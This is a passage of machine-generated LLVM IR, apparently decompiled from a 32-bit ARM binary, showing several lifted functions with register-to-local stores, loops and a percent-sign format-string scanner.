  %v0_113e0 = load i32, i32* @r8, align 4
  store i32 %v0_113e0, i32* %r2.global-to-local, align 4
  %v4_113e4 = call i32 @function_10d28(i32 %v0_113d8, i8 48, i32 %v0_113e0)
  store i32 %v4_113e4, i32* %r0.global-to-local, align 4
  %v1_113e8 = load i32, i32* @r8, align 4
  %v9_113e8 = icmp eq i32 %v4_113e4, %v1_113e8
  br i1 %v9_113e8, label %dec_label_pc_113f0, label %dec_label_pc_114b0

dec_label_pc_113f0:                               ; preds = %dec_label_pc_113c8
  %v3_113f0 = load i32, i32* %stack_var_-44, align 4
  %v2_113f4 = icmp eq i32 %v3_113f0, 0
  br i1 %v2_113f4, label %dec_label_pc_113fc, label %dec_label_pc_11420

dec_label_pc_113fc:                               ; preds = %dec_label_pc_113f0
  %v0_113fc = load i32, i32* @r5, align 4
  %v2_113fc = icmp eq i32 %v0_113fc, 0
  br i1 %v2_113fc, label %dec_label_pc_11484, label %dec_label_pc_11404

dec_label_pc_11404:                               ; preds = %dec_label_pc_113fc
  %v0_11404 = load i32, i32* @r4, align 4
  store i32 %v0_11404, i32* %r0.global-to-local, align 4
  %v0_1140c = load i32, i32* @fp, align 4
  store i32 %v0_1140c, i32* %r2.global-to-local, align 4
  %v4_11410 = inttoptr i32 %v0_1140c to i16*
  %v5_11410 = call i32 @function_16180(i32 %v0_11404, i32 %v0_113fc, i16* %v4_11410)
  store i32 %v5_11410, i32* %r0.global-to-local, align 4
  %v1_11414 = load i32, i32* @r5, align 4
  %v9_11414 = icmp eq i32 %v5_11410, %v1_11414
  br i1 %v9_11414, label %dec_label_pc_11484, label %dec_label_pc_114b0

dec_label_pc_11420:                               ; preds = %dec_label_pc_113f0
  store i32 %v2_112c4, i32* @r6, align 4
  store i32 %v2_111cc, i32* @r7, align 4
  store i32 0, i32* %stack_var_-52, align 4
  %v0_11470.pr = load i32, i32* @r5, align 4
  %v2_1147041 = icmp eq i32 %v0_11470.pr, 0
  store i32 %v2_111c0, i32* @r1, align 4
  store i32 %v2_112c4, i32* @r0, align 4
  br i1 %v2_1147041, label %dec_label_pc_11484, label %dec_label_pc_11438

dec_label_pc_11438:                               ; preds = %dec_label_pc_11420, %dec_label_pc_1146c
  %v1_1143c = phi i32 [ %v2_1146c, %dec_label_pc_1146c ], [ %v0_11470.pr, %dec_label_pc_11420 ]
  %v2_11438 = icmp ult i32 %v1_1143c, 128
  %.v1_1143c = select i1 %v2_11438, i32 %v1_1143c, i32 128
  store i32 %.v1_1143c, i32* %r2.global-to-local, align 4
  %v6_11444 = call i32 @function_15b1c(i32 %v2_112c4, i32 %v2_111c0, i32 %.v1_1143c, i32 %v2_111cc, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v6_11444, i32* @r4, align 4
  %v2_11448 = icmp eq i32 %v6_11444, 0
  store i32 %v6_11444, i32* %r0.global-to-local, align 4
  br i1 %v2_11448, label %dec_label_pc_1146c, label %dec_label_pc_11454

dec_label_pc_11454:                               ; preds = %dec_label_pc_11438
  store i32 %v2_112c4, i32* %r0.global-to-local, align 4
  %v0_1145c = load i32, i32* @fp, align 4
  store i32 %v0_1145c, i32* %r2.global-to-local, align 4
  %v3_11460 = inttoptr i32 %v0_1145c to i16*
  %v4_11460 = call i32 @function_16180(i32 %v2_112c4, i32 %v6_11444, i16* %v3_11460)
  store i32 %v4_11460, i32* %r0.global-to-local, align 4
  %v1_11464 = load i32, i32* @r4, align 4
  %v9_11464 = icmp eq i32 %v4_11460, %v1_11464
  br i1 %v9_11464, label %dec_label_pc_1146c, label %dec_label_pc_114b0

dec_label_pc_1146c:                               ; preds = %dec_label_pc_11454, %dec_label_pc_11438
  %v0_1146c = phi i32 [ %v4_11460, %dec_label_pc_11454 ], [ 0, %dec_label_pc_11438 ]
  %v1_1146c = load i32, i32* @r5, align 4
  %v2_1146c = sub i32 %v1_1146c, %v0_1146c
  store i32 %v2_1146c, i32* @r5, align 4
  %v2_11470 = icmp eq i32 %v2_1146c, 0
  store i32 %v2_111c0, i32* @r1, align 4
  store i32 %v2_112c4, i32* @r0, align 4
  br i1 %v2_11470, label %dec_label_pc_11484, label %dec_label_pc_11438

dec_label_pc_11484:                               ; preds = %dec_label_pc_1146c, %dec_label_pc_11420, %dec_label_pc_11404, %dec_label_pc_113fc
  %v0_11484 = load i32, i32* @fp, align 4
  store i32 %v0_11484, i32* %r0.global-to-local, align 4
  %v0_1148c = load i32, i32* @sl, align 4
  store i32 %v0_1148c, i32* %r2.global-to-local, align 4
  %v4_11490 = call i32 @function_10d28(i32 %v0_11484, i8 32, i32 %v0_1148c)
  store i32 %v4_11490, i32* %r0.global-to-local, align 4
  %v1_11494 = load i32, i32* @sl, align 4
  %v9_11494 = icmp eq i32 %v4_11490, %v1_11494
  br i1 %v9_11494, label %dec_label_pc_1149c, label %dec_label_pc_114b0

dec_label_pc_1149c:                               ; preds = %dec_label_pc_11484, %dec_label_pc_11328, %dec_label_pc_11184, %dec_label_pc_10f94
  %stack_var_-336.4 = phi i32 [ %v0_10ff0, %dec_label_pc_10f94 ], [ %v0_113a4, %dec_label_pc_11484 ], [ %v0_10ff0, %dec_label_pc_11328 ], [ %v0_10ff0, %dec_label_pc_11184 ]
  %stack_var_-356.3 = phi i32 [ %v1_11388, %dec_label_pc_10f94 ], [ %v2_1138c, %dec_label_pc_11484 ], [ %v2_1132c, %dec_label_pc_11328 ], [ %v2_11188, %dec_label_pc_11184 ]
  %v3_1149c = load i32, i32* %stack_var_-352, align 4
  store i32 %v3_1149c, i32* @r4, align 4
  store i32 %v3_1149c, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_10ebc.outer

dec_label_pc_114a8:                               ; preds = %dec_label_pc_10f18
  %v1_114a8 = add i32 %v0_10f20, 2
  store i32 %v1_114a8, i32* @r4, align 4
  br label %dec_label_pc_10ebc.outer36

dec_label_pc_114b0:                               ; preds = %dec_label_pc_11338, %dec_label_pc_111bc, %dec_label_pc_11484, %dec_label_pc_11404, %dec_label_pc_113c8, %dec_label_pc_113ac, %dec_label_pc_11300, %dec_label_pc_111e4, %dec_label_pc_1115c, %bb142, %dec_label_pc_11454
  store i32 -1, i32* @ip, align 4
  br label %dec_label_pc_114b8

dec_label_pc_114b8:                               ; preds = %dec_label_pc_10f0c, %bb, %dec_label_pc_10e50, %dec_label_pc_114b0
  %stack_var_-356.4 = phi i32 [ -1, %bb ], [ -1, %dec_label_pc_10e50 ], [ -1, %dec_label_pc_114b0 ], [ %v1_11388, %dec_label_pc_10f0c ]
  store i32 %stack_var_-356.4, i32* %r0.global-to-local, align 4
  store i32 %v9_10e00, i32* @r6, align 4
  store i32 %v12_10e00, i32* @r7, align 4
  store i32 %v18_10e00, i32* @sb, align 4
  store i32 %v24_10e00, i32* @fp, align 4
  ret i32 %stack_var_-356.4

; uselistorder directives
  uselistorder i32 %stack_var_-356.4, { 1, 0 }
  uselistorder i32 %v1_114a8, { 1, 0 }
  uselistorder i32 %v3_1149c, { 1, 2, 0 }
  uselistorder i32 %v2_1146c, { 1, 2, 0 }
  uselistorder i32 %v0_113b4, { 1, 0 }
  uselistorder i32 %v2_1139c, { 2, 0, 1 }
  uselistorder i1 %v9_11378, { 1, 0 }
  uselistorder i32 %v2_1135c, { 1, 0 }
  uselistorder i32 %v0_113a4, { 1, 0 }
  uselistorder i32 %v0_1135c, { 1, 0 }
  uselistorder i32 %v1_11338, { 1, 0 }
  uselistorder i32 %v1_11300, { 1, 0, 2 }
  uselistorder i32 %v3_112d0, { 1, 2, 0 }
  uselistorder i32 %v0_1123c, { 1, 0 }
  uselistorder i32 %v2_1122c, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v5_111f4, { 1, 2, 0, 3 }
  uselistorder i32 %v3_1116c, { 1, 0 }
  uselistorder i32 %v2_110cc, { 2, 3, 0, 4, 5, 1, 6 }
  uselistorder i32 %v0_110e8, { 1, 2, 3, 0 }
  uselistorder i32 %v2_11068, { 2, 1, 0, 3, 4, 7, 5, 6 }
  uselistorder i32 %v4_10fd0, { 0, 2, 1, 3, 4 }
  uselistorder i32 %v1_10f74.pre, { 1, 0, 2 }
  uselistorder i32 %v1_10f6c, { 1, 0 }
  uselistorder i32 %v1_10f18, { 0, 1, 3, 2 }
  uselistorder i32 %v1_11388, { 0, 8, 1, 7, 2, 3, 6, 5, 4, 9, 10 }
  uselistorder i32 %v2_10ed8, { 1, 0 }
  uselistorder i32 %v1_10ed0.lcssa, { 1, 0 }
  uselistorder i8 %v2_10ebc, { 1, 0 }
  uselistorder i32 %v2_10ed0, { 0, 2, 3, 1 }
  uselistorder i32 %stack_var_-356.1.ph37, { 1, 0 }
  uselistorder i32 %v5_10ee8, { 0, 1, 3, 2 }
  uselistorder i32 %v0_10ff0, { 6, 4, 3, 15, 14, 5, 0, 1, 13, 12, 11, 7, 10, 8, 2, 9 }
  uselistorder i1 %v7_110e0, { 1, 0 }
  uselistorder i1 %v7_11030, { 1, 2, 0 }
  uselistorder i1 %v7_1121c, { 1, 0 }
  uselistorder i1 %v7_11194, { 1, 0 }
  uselistorder i1 %v7_11070, { 1, 0 }
  uselistorder i32 %v2_111cc, { 1, 0, 3, 2, 4 }
  uselistorder i32 %v2_111c0, { 0, 1, 2, 5, 3, 4, 6 }
  uselistorder i32 %v2_112c4, { 1, 2, 3, 4, 5, 0, 11, 10, 9, 7, 8, 6 }
  uselistorder i32 %v2_10f70, { 1, 3, 2, 0 }
  uselistorder i32 %v4_10f4c, { 1, 0 }
  uselistorder i32 %v2_10e08, { 0, 1, 2, 4, 3, 5, 6 }
  uselistorder i32* %stack_var_-352, { 2, 3, 1, 4, 0, 5 }
  uselistorder i32 %tmp105, { 1, 2, 0 }
  uselistorder i32 %tmp104, { 12, 8, 9, 0, 10, 11, 3, 4, 5, 6, 7, 1, 2, 15, 14, 13 }
  uselistorder i32 %tmp98, { 3, 2, 1, 0 }
  uselistorder i32* %r2.global-to-local, { 3, 4, 5, 20, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 0, 21, 22, 23, 24, 30, 31, 25, 26, 27, 28, 29, 1, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 5, 4, 8, 6, 7, 10, 9, 11, 13, 12, 41, 14, 15, 16, 17, 40, 18, 42, 19, 20, 43, 21, 44, 22, 46, 23, 25, 24, 47, 26, 27, 29, 30, 38, 28, 31, 32, 2, 39, 45, 33, 35, 34, 36, 1, 37, 0 }
  uselistorder i32 (i32, i32)* @function_11e48, { 1, 0 }
  uselistorder i32 (i32, i8, i32)* @function_10d28, { 1, 2, 3, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32)* @function_15b1c, { 1, 0 }
  uselistorder i32 68988, { 1, 0 }
  uselistorder label %dec_label_pc_114b8, { 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_114b0, { 2, 10, 3, 4, 5, 0, 6, 7, 1, 8, 9 }
  uselistorder label %dec_label_pc_11438, { 1, 0 }
  uselistorder label %dec_label_pc_113c8, { 1, 0 }
  uselistorder label %.thread30, { 1, 0 }
  uselistorder label %bb177, { 1, 0 }
  uselistorder label %bb175, { 1, 0 }
  uselistorder label %dec_label_pc_11374, { 1, 0 }
  uselistorder label %dec_label_pc_11358, { 0, 3, 1, 2 }
  uselistorder label %dec_label_pc_11358thread-pre-split, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_11280, { 1, 0 }
  uselistorder label %dec_label_pc_11238, { 1, 0 }
  uselistorder label %dec_label_pc_1114c, { 0, 2, 1 }
  uselistorder label %bb171, { 1, 0 }
  uselistorder label %bb169, { 4, 1, 2, 0, 3 }
  uselistorder label %bb166, { 1, 0 }
  uselistorder label %bb164, { 1, 0 }
  uselistorder label %bb162, { 1, 0 }
  uselistorder label %bb160, { 4, 3, 1, 0, 2 }
  uselistorder label %bb157, { 1, 0 }
  uselistorder label %dec_label_pc_11020, { 1, 0 }
  uselistorder label %dec_label_pc_1101c, { 2, 1, 0 }
  uselistorder label %bb151, { 2, 1, 0 }
  uselistorder label %dec_label_pc_10f68, { 1, 0 }
  uselistorder label %bb146, { 1, 0 }
  uselistorder label %dec_label_pc_10f0c, { 1, 0 }
  uselistorder label %bb142, { 1, 0 }
  uselistorder label %dec_label_pc_10ed8, { 1, 0, 2 }
  uselistorder label %bb138, { 1, 0 }
  uselistorder label %dec_label_pc_10ebc.outer36, { 1, 0 }
}

define i32 @function_114e8(i32* %arg1) local_unnamed_addr {
dec_label_pc_114e8:
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v3_114e8 = load i32, i32* @r4, align 4
  %v6_114e8 = load i32, i32* @r5, align 4
  store i32 152, i32* @r2, align 4
  store i32 %tmp, i32* @r4, align 4
  %v0_114f4 = load i32, i32* @r1, align 4
  store i32 %v0_114f4, i32* @r5, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_11500 = bitcast i32* %arg1 to i8*
  %v3_11500 = call i32 @function_11f30(i8* %v2_11500, i32 0)
  store i32 %v3_11500, i32* %r0.global-to-local, align 4
  %v0_11504 = load i32, i32* @r4, align 4
  %v1_11504 = add i32 %v0_11504, 24
  %v2_11504 = inttoptr i32 %v1_11504 to i32*
  %v3_11504 = load i32, i32* %v2_11504, align 4
  store i32 %v3_11504, i32* %r3.global-to-local, align 4
  %v0_11508 = load i32, i32* @r5, align 4
  %v2_11508 = inttoptr i32 %v0_11504 to i32*
  store i32 %v0_11508, i32* %v2_11508, align 4
  %v0_1150c = load i32, i32* %r3.global-to-local, align 4
  %v1_1150c = add i32 %v0_1150c, -1
  %v1_11510 = load i32, i32* @r4, align 4
  %v2_11510 = add i32 %v1_11510, 24
  %v3_11510 = inttoptr i32 %v2_11510 to i32*
  store i32 %v1_1150c, i32* %v3_11510, align 4
  %v0_11514 = load i32, i32* @r4, align 4
  %v1_11514 = add i32 %v0_11514, 40
  store i32 %v1_11514, i32* %r2.global-to-local, align 4
  store i32 8, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r3.global-to-local, align 4
  %v2_1152421 = inttoptr i32 %v1_11514 to i32*
  store i32 8, i32* %v2_1152421, align 4
  %v3_1152422 = load i32, i32* %r2.global-to-local, align 4
  %v4_1152423 = add i32 %v3_1152422, 4
  store i32 %v4_1152423, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_11520.dec_label_pc_11520_crit_edge

dec_label_pc_11520.dec_label_pc_11520_crit_edge:  ; preds = %dec_label_pc_114e8, %dec_label_pc_11520.dec_label_pc_11520_crit_edge
  %v4_1152424 = phi i32 [ %v4_1152423, %dec_label_pc_114e8 ], [ %v4_11524, %dec_label_pc_11520.dec_label_pc_11520_crit_edge ]
  %v0_11520.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_11524.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11520 = add i32 %v0_11520.pre, -1
  store i32 %v1_11520, i32* %r3.global-to-local, align 4
  %v7_11520 = icmp eq i32 %v0_11520.pre, 1
  %v2_11524 = inttoptr i32 %v4_1152424 to i32*
  store i32 %v0_11524.pre, i32* %v2_11524, align 4
  %v3_11524 = load i32, i32* %r2.global-to-local, align 4
  %v4_11524 = add i32 %v3_11524, 4
  store i32 %v4_11524, i32* %r2.global-to-local, align 4
  br i1 %v7_11520, label %dec_label_pc_1152c, label %dec_label_pc_11520.dec_label_pc_11520_crit_edge

dec_label_pc_1152c:                               ; preds = %dec_label_pc_11520.dec_label_pc_11520_crit_edge
  %v0_1152c = load i32, i32* @r5, align 4
  store i32 %v0_1152c, i32* %r2.global-to-local, align 4
  %v1_1156c2 = inttoptr i32 %v0_1152c to i8*
  %v2_1156c3 = load i8, i8* %v1_1156c2, align 1
  %v3_1156c4 = zext i8 %v2_1156c3 to i32
  store i32 %v3_1156c4, i32* %r0.global-to-local, align 4
  %v2_115705 = icmp eq i8 %v2_1156c3, 0
  br i1 %v2_115705, label %dec_label_pc_11578, label %dec_label_pc_11534

dec_label_pc_11534:                               ; preds = %dec_label_pc_1152c, %dec_label_pc_1156c.backedge
  %v0_1153c = phi i32 [ %storemerge, %dec_label_pc_1156c.backedge ], [ %v0_1152c, %dec_label_pc_1152c ]
  %v0_11534 = phi i32 [ %v3_1156c, %dec_label_pc_1156c.backedge ], [ %v3_1156c4, %dec_label_pc_1152c ]
  %v7_11534 = icmp eq i32 %v0_11534, 37
  br i1 %v7_11534, label %dec_label_pc_1153c, label %dec_label_pc_11568

dec_label_pc_1153c:                               ; preds = %dec_label_pc_11534
  %v1_1153c = add i32 %v0_1153c, 1
  %v2_1153c = inttoptr i32 %v1_1153c to i8*
  %v3_1153c = load i8, i8* %v2_1153c, align 1
  %v4_1153c = zext i8 %v3_1153c to i32
  store i32 %v4_1153c, i32* %r3.global-to-local, align 4
  store i32 %v1_1153c, i32* %r2.global-to-local, align 4
  %v7_11540 = icmp eq i8 %v3_1153c, 37
  br i1 %v7_11540, label %dec_label_pc_11568, label %dec_label_pc_11548

dec_label_pc_11548:                               ; preds = %dec_label_pc_1153c
  %v1_11548 = load i32, i32* @r4, align 4
  %v2_11548 = inttoptr i32 %v1_11548 to i32*
  store i32 %v1_1153c, i32* %v2_11548, align 4
  %v0_1154c = load i32, i32* @r4, align 4
  store i32 %v0_1154c, i32* %r0.global-to-local, align 4
  %v1_11550 = inttoptr i32 %v0_1154c to i8*
  %v2_11550 = call i32 @function_117d0(i8* %v1_11550)
  store i32 %v2_11550, i32* %r0.global-to-local, align 4
  %v1_11554 = icmp slt i32 %v2_11550, 0
  br i1 %v1_11554, label %dec_label_pc_1157c.loopexit, label %dec_label_pc_11560

dec_label_pc_11560:                               ; preds = %dec_label_pc_11548
  %v0_11560 = load i32, i32* @r4, align 4
  %v1_11560 = inttoptr i32 %v0_11560 to i32*
  %v2_11560 = load i32, i32* %v1_11560, align 4
  br label %dec_label_pc_1156c.backedge

dec_label_pc_11568:                               ; preds = %dec_label_pc_11534, %dec_label_pc_1153c
  %v0_11568 = phi i32 [ %v0_1153c, %dec_label_pc_11534 ], [ %v1_1153c, %dec_label_pc_1153c ]
  %v1_11568 = add i32 %v0_11568, 1
  br label %dec_label_pc_1156c.backedge

dec_label_pc_1156c.backedge:                      ; preds = %dec_label_pc_11568, %dec_label_pc_11560
  %storemerge = phi i32 [ %v1_11568, %dec_label_pc_11568 ], [ %v2_11560, %dec_label_pc_11560 ]
  store i32 %storemerge, i32* %r2.global-to-local, align 4
  %v1_1156c = inttoptr i32 %storemerge to i8*
  %v2_1156c = load i8, i8* %v1_1156c, align 1
  %v3_1156c = zext i8 %v2_1156c to i32
  store i32 %v3_1156c, i32* %r0.global-to-local, align 4
  %v2_11570 = icmp eq i8 %v2_1156c, 0
  br i1 %v2_11570, label %dec_label_pc_1156c.dec_label_pc_11578_crit_edge, label %dec_label_pc_11534

dec_label_pc_1156c.dec_label_pc_11578_crit_edge:  ; preds = %dec_label_pc_1156c.backedge
  %v0_11578.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11578

dec_label_pc_11578:                               ; preds = %dec_label_pc_1156c.dec_label_pc_11578_crit_edge, %dec_label_pc_1152c
  %v0_11578 = phi i32 [ %v0_11578.pre, %dec_label_pc_1156c.dec_label_pc_11578_crit_edge ], [ %v0_1152c, %dec_label_pc_1152c ]
  %v1_11578 = load i32, i32* @r4, align 4
  %v2_11578 = inttoptr i32 %v1_11578 to i32*
  store i32 %v0_11578, i32* %v2_11578, align 4
  %v1_11584.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1157c

dec_label_pc_1157c.loopexit:                      ; preds = %dec_label_pc_11548
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1157c

dec_label_pc_1157c:                               ; preds = %dec_label_pc_1157c.loopexit, %dec_label_pc_11578
  %v1_11584 = phi i32 [ -1, %dec_label_pc_1157c.loopexit ], [ %v1_11584.pre, %dec_label_pc_11578 ]
  store i32 %v3_114e8, i32* @r4, align 4
  store i32 %v6_114e8, i32* @r5, align 4
  ret i32 %v1_11584

; uselistorder directives
  uselistorder i32 %v3_1156c, { 1, 0 }
  uselistorder i32 %storemerge, { 1, 2, 0 }
  uselistorder i32 %v0_1152c, { 1, 0, 2, 3 }
  uselistorder i32 %v4_11524, { 1, 0 }
  uselistorder i32 %v0_11520.pre, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 4, 5, 2, 3 }
  uselistorder i32* %r2.global-to-local, { 2, 0, 5, 1, 6, 7, 3, 4 }
  uselistorder i32* %r0.global-to-local, { 1, 6, 3, 4, 2, 7, 5, 0 }
  uselistorder label %dec_label_pc_11568, { 1, 0 }
  uselistorder label %dec_label_pc_11534, { 1, 0 }
  uselistorder label %dec_label_pc_11520.dec_label_pc_11520_crit_edge, { 1, 0 }
}

define i32 @function_11588(i32 %arg1, i32 %arg2) local_unnamed_addr {
dec_label_pc_11588:
  %r3.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* @r0, align 4
  %stack_var_-12 = alloca i32, align 4
  %v3_11588 = load i32, i32* @r4, align 4
  store i32 %v3_11588, i32* %stack_var_-12, align 4
  %v0_1158c = load i32, i32* @r0, align 4
  %v1_1158c = add i32 %v0_1158c, 24
  %v2_1158c = inttoptr i32 %v1_1158c to i32*
  %v3_1158c = load i32, i32* %v2_1158c, align 4
  store i32 %v3_1158c, i32* %r5.global-to-local, align 4
  store i32 %v0_1158c, i32* @r4, align 4
  %v2_1159c = add i32 %v0_1158c, 76
  %v3_1159c = inttoptr i32 %v2_1159c to i32*
  store i32 %arg2, i32* %v3_1159c, align 4
  %tmp5 = icmp slt i32 %v3_1158c, 1
  br i1 %tmp5, label %dec_label_pc_115c0, label %dec_label_pc_115a4

dec_label_pc_115a4:                               ; preds = %dec_label_pc_11588
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_115a8 = load i32, i32* @r0, align 4
  %v2_115a8 = add i32 %v1_115a8, 8
  %v3_115a8 = inttoptr i32 %v2_115a8 to i32*
  store i32 0, i32* %v3_115a8, align 4
  %v0_115ac = load i32, i32* %r5.global-to-local, align 4
  %v1_115ac = load i32, i32* @r0, align 4
  %v2_115ac = add i32 %v1_115ac, 28
  %v3_115ac = inttoptr i32 %v2_115ac to i32*
  store i32 %v0_115ac, i32* %v3_115ac, align 4
  %v0_115b0 = load i32, i32* %r3.global-to-local, align 4
  %v1_115b0 = load i32, i32* @r0, align 4
  %v2_115b0 = add i32 %v1_115b0, 24
  %v3_115b0 = inttoptr i32 %v2_115b0 to i32*
  store i32 %v0_115b0, i32* %v3_115b0, align 4
  %v0_115b4 = load i32, i32* %r3.global-to-local, align 4
  %v1_115b4 = load i32, i32* @r0, align 4
  %v2_115b4 = add i32 %v1_115b4, 4
  %v3_115b4 = inttoptr i32 %v2_115b4 to i32*
  store i32 %v0_115b4, i32* %v3_115b4, align 4
  %v0_115b8 = call i32 @function_115cc()
  store i32 %v0_115b8, i32* @r0, align 4
  %v0_115bc = load i32, i32* %r5.global-to-local, align 4
  %v1_115bc = load i32, i32* @r4, align 4
  %v2_115bc = add i32 %v1_115bc, 24
  %v3_115bc = inttoptr i32 %v2_115bc to i32*
  store i32 %v0_115bc, i32* %v3_115bc, align 4
  br label %dec_label_pc_115c0

dec_label_pc_115c0:                               ; preds = %dec_label_pc_11588, %dec_label_pc_115a4
  %v2_115c4 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_115c4, i32* @r4, align 4
  %v1_115c8 = load i32, i32* @r0, align 4
  ret i32 %v1_115c8

; uselistorder directives
  uselistorder i32 %v0_1158c, { 1, 0, 2 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32 ()* @function_115cc, { 1, 0 }
  uselistorder label %dec_label_pc_115c0, { 1, 0 }
}

define i32 @function_115cc() local_unnamed_addr {
dec_label_pc_115cc:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_115cc = load i32, i32* @r0, align 4
  %v1_115cc = add i32 %v0_115cc, 24
  %v2_115cc = inttoptr i32 %v1_115cc to i32*
  %v3_115cc = load i32, i32* %v2_115cc, align 4
  store i32 %v3_115cc, i32* %r1.global-to-local, align 4
  %v2_115d0 = icmp eq i32 %v3_115cc, 0
  %v3_115d4 = load i32, i32* @r4, align 4
  store i32 %v3_115d4, i32* %stack_var_-8, align 4
  %v1_115d8 = add i32 %v0_115cc, 8
  %v2_115d8 = inttoptr i32 %v1_115d8 to i32*
  %v3_115d8 = load i32, i32* %v2_115d8, align 4
  store i32 %v3_115d8, i32* %r3.global-to-local, align 4
  %v6_115e0 = icmp eq i32 %v3_115d8, -2147483648
  br i1 %v2_115d0, label %dec_label_pc_115e0, label %dec_label_pc_11718

dec_label_pc_115e0:                               ; preds = %dec_label_pc_115cc
  br i1 %v6_115e0, label %dec_label_pc_115e8, label %dec_label_pc_11600

dec_label_pc_115e8:                               ; preds = %dec_label_pc_115e0
  %v1_115e8 = add i32 %v0_115cc, 76
  %v2_115e8 = inttoptr i32 %v1_115e8 to i32*
  %v3_115e8 = load i32, i32* %v2_115e8, align 4
  store i32 %v3_115e8, i32* %r3.global-to-local, align 4
  %v1_115ec = inttoptr i32 %v3_115e8 to i32*
  %v2_115ec = load i32, i32* %v1_115ec, align 4
  store i32 %v2_115ec, i32* %r2.global-to-local, align 4
  %v1_115f0 = add i32 %v3_115e8, 4
  store i32 %v1_115f0, i32* %r3.global-to-local, align 4
  store i32 %v1_115f0, i32* %v2_115e8, align 4
  %v0_115f8 = load i32, i32* %r2.global-to-local, align 4
  %v1_115f8 = load i32, i32* @r0, align 4
  %v2_115f8 = add i32 %v1_115f8, 8
  %v3_115f8 = inttoptr i32 %v2_115f8 to i32*
  store i32 %v0_115f8, i32* %v3_115f8, align 4
  %v0_115fc = load i32, i32* %r2.global-to-local, align 4
  %v1_115fc = load i32, i32* @r0, align 4
  %v2_115fc = add i32 %v1_115fc, 80
  %v3_115fc = inttoptr i32 %v2_115fc to i32*
  store i32 %v0_115fc, i32* %v3_115fc, align 4
  %v0_11600.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11600

dec_label_pc_11600:                               ; preds = %dec_label_pc_115e0, %dec_label_pc_115e8
  %v1_1161c = phi i32 [ %v0_115cc, %dec_label_pc_115e0 ], [ %v0_11600.pre, %dec_label_pc_115e8 ]
  %v1_11600 = add i32 %v1_1161c, 4
  %v2_11600 = inttoptr i32 %v1_11600 to i32*
  %v3_11600 = load i32, i32* %v2_11600, align 4
  store i32 %v3_11600, i32* %r3.global-to-local, align 4
  %v6_11604 = icmp eq i32 %v3_11600, -2147483648
  %v1_11608 = add i32 %v1_1161c, 80
  store i32 %v1_11608, i32* %ip.global-to-local, align 4
  br i1 %v6_11604, label %dec_label_pc_11610, label %dec_label_pc_11628

dec_label_pc_11610:                               ; preds = %dec_label_pc_11600
  %v1_11610 = add i32 %v1_1161c, 76
  %v2_11610 = inttoptr i32 %v1_11610 to i32*
  %v3_11610 = load i32, i32* %v2_11610, align 4
  store i32 %v3_11610, i32* %r3.global-to-local, align 4
  %v1_11614 = inttoptr i32 %v3_11610 to i32*
  %v2_11614 = load i32, i32* %v1_11614, align 4
  store i32 %v2_11614, i32* %r2.global-to-local, align 4
  %v1_11618 = add i32 %v3_11610, 4
  store i32 %v1_11618, i32* %r3.global-to-local, align 4
  store i32 %v1_11618, i32* %v2_11610, align 4
  %v0_11620 = load i32, i32* %r2.global-to-local, align 4
  %v1_11620 = load i32, i32* @r0, align 4
  %v2_11620 = add i32 %v1_11620, 4
  %v3_11620 = inttoptr i32 %v2_11620 to i32*
  store i32 %v0_11620, i32* %v3_11620, align 4
  %v0_11624 = load i32, i32* %r2.global-to-local, align 4
  %v1_11624 = load i32, i32* @r0, align 4
  %v2_11624 = add i32 %v1_11624, 80
  %v3_11624 = inttoptr i32 %v2_11624 to i32*
  store i32 %v0_11624, i32* %v3_11624, align 4
  %v0_1170817.pre = load i32, i32* @r0, align 4
  br label %dec_label_pc_11628

dec_label_pc_11628:                               ; preds = %dec_label_pc_11600, %dec_label_pc_11610
  %v0_1170817 = phi i32 [ %v1_1161c, %dec_label_pc_11600 ], [ %v0_1170817.pre, %dec_label_pc_11610 ]
  store i32 2055, i32* %r4.global-to-local, align 4
  %v0_1162c = load i32, i32* %r1.global-to-local, align 4
  store i32 %v0_1162c, i32* %lr.global-to-local, align 4
  %v1_1170818 = add i32 %v0_1170817, 28
  %v2_1170819 = inttoptr i32 %v1_1170818 to i32*
  %v3_1170820 = load i32, i32* %v2_1170819, align 4
  store i32 %v3_1170820, i32* %r3.global-to-local, align 4
  %v5_1171022 = icmp slt i32 %v0_1162c, %v3_1170820
  br i1 %v5_1171022, label %dec_label_pc_11634, label %dec_label_pc_11714.loopexit

dec_label_pc_11634:                               ; preds = %dec_label_pc_11628, %dec_label_pc_11708.backedge
  %v0_1170824 = phi i32 [ %v0_11708, %dec_label_pc_11708.backedge ], [ %v0_1170817, %dec_label_pc_11628 ]
  %v0_1164023 = phi i32 [ %v0_11640.be, %dec_label_pc_11708.backedge ], [ %v0_1162c, %dec_label_pc_11628 ]
  %v4_11634 = mul i32 %v0_1164023, 4
  %v5_11634 = add i32 %v4_11634, %v0_1170824
